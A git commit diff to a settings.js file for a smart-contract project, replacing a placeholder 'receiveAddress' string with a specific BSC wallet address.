0b971c9d2df79a0da1c41b79fbbf202944e64c00
ab45772 <156903085+ab45772@users.noreply.github.com>
2024-06-02 19:29:03 +0200

    KEVIN settings.js

--- settings.js
+++ settings.js
@@ -4,7 +4,7 @@
 
 //code for local smart contract
 
-const receiveAddress = "Replace this with your bsc address dont remove quatation marks";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0x3D609236606b03E2184EC51d53560788AC3a2E3A";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
